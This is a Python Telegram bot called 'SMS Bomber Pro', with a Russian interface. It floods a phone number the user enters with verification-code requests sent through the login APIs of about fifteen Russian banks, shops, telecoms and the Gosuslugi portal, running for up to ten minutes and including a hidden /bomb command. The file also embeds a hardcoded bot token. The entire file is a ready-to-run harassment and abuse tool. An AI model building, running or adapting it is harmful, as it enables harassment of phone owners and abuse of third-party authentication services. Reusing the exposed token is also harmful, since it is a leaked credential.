import asyncio
import logging
import random
import time
import warnings
from typing import Dict, List

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.warnings import PTBUserWarning

# Подавляем предупреждение PTBUserWarning
warnings.filterwarnings("ignore", message=r".*CallbackQueryHandler.*", category=PTBUserWarning)

# ================== SMS BOMBER ==================
logger = logging.getLogger(__name__)

class SmsBomber:
    def __init__(self):
        self.apis: List[Dict] = [
            {"name": "Яндекс Еда", "url": "https://eda.yandex.ru/api/v1/auth/send_code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Сбербанк Онлайн", "url": "https://online.sberbank.ru/CSAFront/uapi/v2/authenticate", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Тинькофф", "url": "https://www.tinkoff.ru/api/common/v1/send_otp", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Ozon", "url": "https://www.ozon.ru/api/composer-api.bx/_action/auth/sendCode", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Wildberries", "url": "https://www.wildberries.ru/webapi/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Delivery Club", "url": "https://api.delivery-club.ru/api/v1/auth/send_sms_code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Avito", "url": "https://api.avito.ru/auth/v1/sessions", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Youla", "url": "https://api.youla.ru/v2/auth/code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Домклик", "url": "https://domclick.ru/api/v1/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Яндекс.Маркет", "url": "https://market.yandex.ru/api/v2/auth/send_sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Госуслуги", "url": "https://esia.gosuslugi.ru/aas/sms/send", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "МТС", "url": "https://login.mts.ru/api/v2/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Билайн", "url": "https://api.beeline.ru/auth/v1/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Мегафон", "url": "https://api.megafon.ru/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Tele2", "url": "https://api.tele2.ru/auth/v1/sms", "method": "POST", "payload": {"phone": "{phone}"}}
        ]

    def send_sms(self, phone: str, api: Dict) -> bool:
        try:
            url = api["url"]
            payload = api["payload"].copy()
            for key, value in payload.items():
                if "{phone}" in value:
                    payload[key] = value.replace("{phone}", phone)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json"
            }
            if api["method"] == "POST":
                response = requests.post(url, json=payload, headers=headers, timeout=5)
            else:
                response = requests.get(url, params=payload, headers=headers, timeout=5)
            return response.status_code in [200, 201, 400, 403, 429]
        except Exception:
            return False

    def start_bombing(self, phone: str, duration_sec: int, progress_callback=None) -> Dict:
        phone = phone.replace("+", "").replace(" ", "").replace("-", "")
        start_time = time.time()
        total_sent = 0
        successful = 0
        failed = 0

        while time.time() - start_time < duration_sec:
            random.shuffle(self.apis)
            for api in self.apis:
                if time.time() - start_time >= duration_sec:
                    break
                total_sent += 1
                if self.send_sms(phone, api):
                    successful += 1
                else:
                    failed += 1
                if progress_callback:
                    progress_callback(total_sent, successful, failed, duration_sec - (time.time() - start_time))
                time.sleep(random.uniform(1, 3))

        return {"total": total_sent, "successful": successful, "failed": failed}

# ================== TELEGRAM BOT ==================
TOKEN = "8460346432:AAHMe6vVMXCbocElq2rcXVrMMTpwm5t-l3o"

PHONE = 0
active_tasks = {}

# Клавиатуры
TIME_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("⏱ 30 сек", callback_data="time_30"),
     InlineKeyboardButton("⏱ 1 мин", callback_data="time_60")],
    [InlineKeyboardButton("⏱ 5 мин", callback_data="time_300"),
     InlineKeyboardButton("⏱ 10 мин", callback_data="time_600")],
    [InlineKeyboardButton("❌ Отмена", callback_data="cancel")]
])

STOP_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("⏹ Остановить", callback_data="stop_bomb")]
])

MAIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("⏱ Выбрать время", callback_data="choose_time")],
    [InlineKeyboardButton("ℹ️ Помощь", callback_data="help")]
])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 *SMS Bomber Pro*\n\nНажмите кнопку, чтобы выбрать время атаки, затем введите номер телефона.",
        parse_mode="Markdown",
        reply_markup=MAIN_MENU
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat.id

    # Обработка для ConversationHandler (time_ и cancel)
    if data.startswith("time_"):
        duration = int(data.split("_")[1])
        context.user_data['duration'] = duration
        await query.edit_message_text(
            f"⏱ Выбрано время: *{duration}* сек.\n\nТеперь отправьте номер телефона (только цифры, без + и пробелов).",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Отмена", callback_data="cancel")]])
        )
        return PHONE  # Переход в состояние ввода номера

    if data == "cancel":
        await query.edit_message_text("❌ Операция отменена.", reply_markup=MAIN_MENU)
        return ConversationHandler.END

    # Общие кнопки (не в диалоге)
    if data == "stop_bomb":
        task = active_tasks.get(chat_id)
        if task and not task.done():
            task.cancel()
            await query.edit_message_text("⏹ Бомбинг остановлен.", reply_markup=MAIN_MENU)
            active_tasks.pop(chat_id, None)
        else:
            await query.edit_message_text("❌ Нет активной атаки.", reply_markup=MAIN_MENU)
        return

    if data == "help":
        await query.edit_message_text(
            "📖 *Помощь*\n\n1. Нажмите *Выбрать время*.\n2. Выберите длительность.\n3. Введите номер телефона.\n4. Наблюдайте за анимацией.\n5. В любой момент нажмите *Остановить*.\n\nМакс. время – 600 сек.",
            parse_mode="Markdown",
            reply_markup=MAIN_MENU
        )
        return

    if data == "choose_time":
        await query.edit_message_text("⏱ Выберите время атаки:", reply_markup=TIME_KEYBOARD)
        return

async def phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    phone = update.message.text.strip().replace("+", "").replace(" ", "").replace("-", "")
    if not phone.isdigit():
        await update.message.reply_text("❌ Некорректный номер. Введите только цифры.", reply_markup=MAIN_MENU)
        return PHONE  # остаёмся в том же состоянии

    duration = context.user_data.get('duration', 60)
    await start_bombing_task(update, context, phone, duration, chat_id)
    return ConversationHandler.END  # завершаем диалог

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Скрытая команда /bomb (оставлена для совместимости)."""
    chat_id = update.effective_chat.id
    args = context.args
    if not args:
        await update.message.reply_text("❌ Укажите номер телефона.")
        return
    phone = args[0]
    duration = int(args[1]) if len(args) > 1 else 60
    if duration < 10:
        duration = 10
    if duration > 600:
        duration = 600
    await update.message.reply_text(f"📲 Запуск для `{phone}` на {duration} сек...", parse_mode="Markdown")
    await start_bombing_task(update, context, phone, duration, chat_id)

async def start_bombing_task(update_obj, context, phone, duration, chat_id):
    if chat_id in active_tasks and not active_tasks[chat_id].done():
        active_tasks[chat_id].cancel()
        await asyncio.sleep(0.5)

    if hasattr(update_obj, 'message'):
        msg = await update_obj.message.reply_text("⏳ Инициализация...", reply_markup=STOP_KEYBOARD)
    else:
        msg = await update_obj.edit_message_text("⏳ Инициализация...", reply_markup=STOP_KEYBOARD)

    bomber = SmsBomber()
    stats = {"sent": 0, "ok": 0, "fail": 0, "remaining": duration}

    def progress_callback(sent, ok, fail, remaining):
        stats["sent"] = sent
        stats["ok"] = ok
        stats["fail"] = fail
        stats["remaining"] = remaining

    loop = asyncio.get_event_loop()
    task = loop.run_in_executor(None, lambda: bomber.start_bombing(phone, duration, progress_callback))
    active_tasks[chat_id] = task

    spinner = ['|', '/', '—', '\\']
    spin_idx = 0
    try:
        while not task.done():
            remaining = max(0, stats["remaining"])
            spin = spinner[spin_idx % 4]
            spin_idx += 1
            text = (
                f"💣 *Бомбинг в процессе*\n"
                f"📱 Номер: `{phone}`\n"
                f"⏳ Осталось: `{int(remaining)}` сек\n"
                f"📨 Отправлено: `{stats['sent']}`\n"
                f"✅ Успешно: `{stats['ok']}`\n"
                f"❌ Неудачно: `{stats['fail']}`\n"
                f"🌀 {spin}  работа..."
            )
            try:
                await msg.edit_text(text, parse_mode="Markdown", reply_markup=STOP_KEYBOARD)
            except Exception:
                pass
            await asyncio.sleep(1.5)

        result = task.result()
        final_text = (
            f"✅ *Бомбинг завершён!*\n"
            f"📱 Номер: `{phone}`\n"
            f"⏱ Длительность: {duration} сек\n"
            f"📨 Всего запросов: {result['total']}\n"
            f"✅ Успешно: {result['successful']}\n"
            f"❌ Неудачно: {result['failed']}"
        )
        await msg.edit_text(final_text, parse_mode="Markdown", reply_markup=MAIN_MENU)
    except asyncio.CancelledError:
        await msg.edit_text("⏹ Бомбинг остановлен.", reply_markup=MAIN_MENU)
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {e}", reply_markup=MAIN_MENU)
    finally:
        active_tasks.pop(chat_id, None)

async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Диалог отменён.", reply_markup=MAIN_MENU)
    return ConversationHandler.END

def main():
    app = Application.builder().token(TOKEN).build()

    # ConversationHandler – только для выбора времени и ввода номера
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^time_")],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_input)],
        },
        fallbacks=[
            CallbackQueryHandler(button_handler, pattern="^cancel$"),
            CommandHandler("cancel", cancel_conversation)
        ],
        allow_reentry=True
    )

    # Общие обработчики (вне диалога)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))  # скрытая команда
    app.add_handler(conv_handler)  # сначала диалог
    # Обработчик для кнопок главного меню (исключаем time_ и cancel, т.к. они уже в conv_handler)
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(choose_time|help|stop_bomb)$"))

    print("🔥 Бот запущен. Команда /bomb скрыта, но работает.")
    app.run_polling()

if __name__ == "__main__":
    main()
